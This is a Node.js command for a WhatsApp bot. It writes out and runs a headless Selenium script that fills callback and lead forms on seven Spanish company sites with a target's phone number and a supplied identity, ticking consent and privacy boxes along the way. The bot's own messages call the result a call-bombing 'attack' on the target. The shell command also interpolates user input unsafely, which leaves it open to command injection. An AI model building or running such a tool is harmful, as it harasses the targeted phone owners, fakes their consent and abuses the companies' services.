const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const util = require('util');
const execPromise = util.promisify(exec);

// Todo el código de Perubian encapsulado para auto-generarse
const pythonCode = `
import sys
import time
import requests
import random
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select

class WebBase:
    def __init__(self, nombre, url):
        self.nombre = nombre
        self.url = url

    def click_seguro(self, browser, xpath, timeout=1):
        try:
            el = browser.find_element(By.XPATH, xpath)
            browser.execute_script("arguments[0].scrollIntoView({block: 'center'});", el)
            browser.execute_script("arguments[0].click();", el)
            time.sleep(timeout)
            return True
        except: return False

    def escribir_seguro(self, browser, xpath, texto, timeout=1):
        try:
            el = browser.find_element(By.XPATH, xpath)
            el.clear()
            el.send_keys(texto)
            time.sleep(timeout)
            return True
        except: return False

    def aceptar_cookies(self, browser, xpath):
        self.click_seguro(browser, xpath, timeout=1)

class SecuritasDirect(WebBase):
    def __init__(self): super().__init__("Securitas Direct", "https://www.securitasdirect.es/")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(2)
        self.aceptar_cookies(b, '//*[@id="CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll"]')
        self.escribir_seguro(b, '//*[@id="edit-telefono1"]', tel)
        return self.click_seguro(b, '//*[@id="edit-submit"]')

class Euroinnova(WebBase):
    def __init__(self): super().__init__("Euroinnova", "https://www.euroinnova.com/")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(2)
        self.aceptar_cookies(b, '//*[@id="accept-cookies"]')
        self.click_seguro(b, '/html/body/div[2]/div/div[2]/div[2]/button')
        time.sleep(1)
        self.escribir_seguro(b, '//*[@id="name"]', n)
        self.escribir_seguro(b, '//*[@id="lastname"]', a)
        self.escribir_seguro(b, '//*[@id="mail"]', e)
        self.escribir_seguro(b, '//*[@id="tel"]', tel)
        try:
            Select(b.find_element(By.XPATH, '/html/body/div[6]/div/div/div[3]/form/div[4]/div[2]/div/select')).select_by_index(9)
        except: pass
        self.click_seguro(b, '//*[@id="privacidad"]')
        return self.click_seguro(b, '//*[@id="btn_enviar"]')

class Genesis(WebBase):
    def __init__(self): super().__init__("Genesis", "https://www.genesis.es/modal/c2c")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(2)
        self.aceptar_cookies(b, '//*[@id="onetrust-accept-btn-handler"]')
        try: Select(b.find_element(By.XPATH, '/html/body/div[1]/div/main/div/div/div/article/div/div/div/div/div/form/section/div/div[2]/div/select')).select_by_index(1)
        except: pass
        self.escribir_seguro(b, '//*[@id="edit-por-quien-preguntamos-"]', n)
        self.escribir_seguro(b, '//*[@id="edit-phone"]', tel)
        self.escribir_seguro(b, '//*[@id="edit-phone-confirmation"]', tel)
        self.click_seguro(b, '/html/body/div[1]/div/main/div/div/div/article/div/div/div/div/div/form/section/div/div[7]/div/label')
        return self.click_seguro(b, '//*[@id="edit-actions-submit"]')

class Jazztel(WebBase):
    def __init__(self): super().__init__("Jazztel", "https://llamamegratis.es/jazztel/v2/webphone.html")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(1)
        self.escribir_seguro(b, '//*[@id="phoneNumber"]', tel)
        self.click_seguro(b, '/html/body/div[1]/div[1]/div[2]/div[3]/div/div[2]/form/div/div[3]/div/select/option[2]')
        return self.click_seguro(b, '//*[@id="env"]')

class Vodafone(WebBase):
    def __init__(self): super().__init__("Vodafone", "https://www.vodafone.es/c/empresas/es/marketing-online/")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(2)
        self.aceptar_cookies(b, '//*[@id="onetrust-accept-btn-handler"]')
        self.click_seguro(b, '/html/body/div[2]/main/div[1]/div/div[2]/div/div/div/section/div/div/div/div/div/a[1]/span[1]')
        time.sleep(1)
        self.escribir_seguro(b, '//*[@id="phone"]', tel)
        try:
            b.execute_script("arguments[0].click();", b.find_element(By.XPATH, '//*[@id="cmb-gdpr"]'))
            b.execute_script("arguments[0].click();", b.find_element(By.XPATH, '//*[@id="cmb-check"]'))
        except: pass
        return self.click_seguro(b, '/html/body/div[2]/main/div[14]/div/div/div/span/div/div[2]/div[1]/div/div/form/input[2]')

class ISalud(WebBase):
    def __init__(self): super().__init__("iSalud", "https://vsec.es")
    def ejecutar(self, b, n, a, tel, e):
        try:
            r = requests.post("https://vsec.es/llamada.php", data={"name": n, "surname": a, "email": e, "number": tel}, timeout=5)
            return r.status_code == 200
        except: return False

class Mapfre(WebBase):
    def __init__(self): super().__init__("Mapfre", "https://www.mapfre.es/boi/inicio.do?origen=autos_portalmapfre&destino=sgc_new&producto=autos")
    def ejecutar(self, b, n, a, tel, e):
        b.get(self.url)
        time.sleep(2)
        self.aceptar_cookies(b, '//*[@id="onetrust-accept-btn-handler"]')
        self.escribir_seguro(b, '//*[@id="nombre"]', n)
        self.escribir_seguro(b, '//*[@id="primer_apellido"]', a)
        self.escribir_seguro(b, '//*[@id="codigo_postal"]', "08002")
        self.escribir_seguro(b, '//*[@id="tlfn"]', tel)
        self.click_seguro(b, '//*[@id="marca_robinson"]')
        self.click_seguro(b, '//*[@id="politicaprivacidad"]')
        return self.click_seguro(b, '/html/body/div[1]/main/div/div/div[2]/form/fieldset/div[10]/input')

def run_attack(tel, nom, ape, em):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--log-level=3')
    
    # Para la VPS: Reducimos tiempos de carga pesados si no son necesarios
    options.page_load_strategy = 'eager' 
    
    webs = [SecuritasDirect(), Euroinnova(), Genesis(), Jazztel(), Vodafone(), ISalud(), Mapfre()]
    exitos = 0
    total = len(webs)
    
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
        driver.set_page_load_timeout(15)
        
        for w in webs:
            try:
                if w.ejecutar(driver, nom, ape, tel, em): exitos += 1
            except: pass

        driver.quit()
        print(f"RESULTADO|{exitos}|{total}")
    except Exception as e:
        print(f"ERROR|{str(e)}")

if __name__ == "__main__":
    if len(sys.argv) > 4:
        run_attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
`;

module.exports = {
    name: 'send',
    // Filtro: send seguido de teléfono de 9 dígitos y 3 campos más (nombre, apellido, email)
    match: (text) => /^send\s+[679]\d{8}\s+\S+\s+\S+\s+\S+@\S+\.\S+$/i.test(text.trim()),
    
    execute: async ({ sock, remitente, textoLimpio, msg }) => {
        const args = textoLimpio.trim().split(/\s+/);
        const numero = args[1];
        const nombre = args[2];
        const apellido = args[3];
        const email = args[4];

        // Guardará el script en la raíz del proyecto para evitar problemas de permisos
        const pythonPath = path.join(__dirname, '../perubian_engine.py');

        // Autogenerar archivo si no existe o fue borrado
        if (!fs.existsSync(pythonPath)) {
            fs.writeFileSync(pythonPath, pythonCode, { encoding: 'utf8', mode: 0o755 });
        }

        let statusMsg = await sock.sendMessage(remitente, { 
            text: `⏳ *Motor C2C Iniciado*\n\n📡 *Objetivo:* ${numero}\n👤 *Identidad:* ${nombre} ${apellido}\n\n_Ejecutando instancias Headless en la VPS... Esto puede tardar unos minutos._` 
        }, { quoted: msg });

        try {
            // Ejecución aislada con timeout de 3 minutos para que no sature la VPS indefinidamente
            const comando = `python3 "${pythonPath}" "${numero}" "${nombre}" "${apellido}" "${email}"`;
            const { stdout } = await execPromise(comando, { timeout: 180000 });
            
            if (stdout.includes('RESULTADO')) {
                const [_, exitos, total] = stdout.trim().split('|');
                await sock.sendMessage(remitente, { 
                    text: `✅ *Ataque C2C Finalizado*\n\n📞 *Objetivo:* ${numero}\n📈 *Impactos confirmados:* ${exitos} de ${total} formularios.\n🚀 El bombardeo de llamadas iniciará en breve.`,
                    edit: statusMsg.key 
                });
            } else {
                throw new Error(stdout || "Error silencioso en Python");
            }

        } catch (error) {
            console.error("[PERUBIAN ENGINE ERROR]:", error);
            
            let errMsg = error.killed 
                ? "❌ Tiempo límite de 3 minutos excedido. Proceso destruido para liberar RAM."
                : `❌ *Error técnico en Selenium:* \n${error.message.substring(0, 150)}`;

            await sock.sendMessage(remitente, { text: errMsg, edit: statusMsg.key });
        }
    }
};
